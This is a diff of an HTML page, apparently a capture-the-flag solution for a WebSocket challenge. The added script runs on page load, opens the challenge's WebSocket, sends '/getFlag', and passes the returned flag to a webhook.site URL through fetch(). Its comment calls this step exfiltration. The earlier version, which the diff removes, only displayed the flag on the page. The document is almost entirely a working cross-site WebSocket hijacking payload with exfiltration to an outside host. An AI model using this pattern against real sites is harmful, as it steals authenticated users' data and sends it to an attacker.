@@ -1,87 +1,24 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>WebSocket Test</title>
-    <style>
-        .flag {
-            color: red;
-            font-size: 30px;
-            font-weight: bold;
-            margin: 20px;
-            padding: 10px;
-            background-color: yellow;
-        }
-    </style>
-</head>
 <body>
-    <h1>WebSocket Flag Test</h1>
-    <div id="log"></div>
-    
-    <script>
-        // Função para registrar mensagens
-        function log(msg) {
-            const logDiv = document.getElementById('log');
-            logDiv.innerHTML += msg + '<br>';
-            console.log(msg);
-        }
-        
-        // Garantir que o script seja executado após o carregamento completo
-        window.onload = function() {
-            log("Página carregada, aguardando 500ms...");
-            
-            // Pequeno atraso para garantir que tudo esteja pronto
-            setTimeout(function() {
-                log("Tentando conectar ao WebSocket...");
-                
-                try {
-                    // Criar conexão WebSocket
-                    const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
-                    
-                    ws.onopen = function() {
-                        log("Conexão WebSocket estabelecida!");
-                        
-                        // Aguardar mais 500ms antes de enviar o comando
-                        setTimeout(function() {
-                            log("Enviando comando /getFlag...");
-                            ws.send(JSON.stringify({
-                                sender: 'user',
-                                message: '/getFlag'
-                            }));
-                        }, 500);
-                    };
-                    
-                    ws.onmessage = function(event) {
-                        try {
-                            const data = JSON.parse(event.data);
-                            log("Mensagem recebida: " + data.message);
-                            
-                            // Se for a flag, destacar de forma bem visível
-                            if (data.message && data.message.includes('Flag:')) {
-                                const flagDiv = document.createElement('div');
-                                flagDiv.className = 'flag';
-                                flagDiv.textContent = data.message;
-                                document.body.appendChild(flagDiv);
-                                
-                                // Também definir como título da página
-                                document.title = data.message;
-                            }
-                        } catch (e) {
-                            log("Erro ao processar mensagem: " + e.message);
-                        }
-                    };
-                    
-                    ws.onerror = function(error) {
-                        log("Erro na conexão: " + error);
-                    };
-                    
-                    ws.onclose = function() {
-                        log("Conexão fechada");
-                    };
-                } catch (e) {
-                    log("Erro ao criar conexão: " + e);
-                }
-            }, 500);
-        };
-    </script>
+<script>
+(async () => {
+  // 1) Conecta ao WebSocket do desafio
+  const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
+  ws.onopen = () => {
+    // 2) Pede a flag
+    ws.send(JSON.stringify({sender:'user', message:'/getFlag'}));
+  };
+  ws.onmessage = async (e) => {
+    const data = JSON.parse(e.data);
+    if (data.message && data.message.startsWith('Flag:')) {
+      // 3) Exfiltra para seu webhook
+      await fetch('https://60ceeedd-4d07-4620-94b4-d916596ae4d6.webhook.site/?flag=' +
+                  encodeURIComponent(data.message));
+    }
+  };
+})();
+</script>
+<p>Loading…</p>
 </body>
 </html>
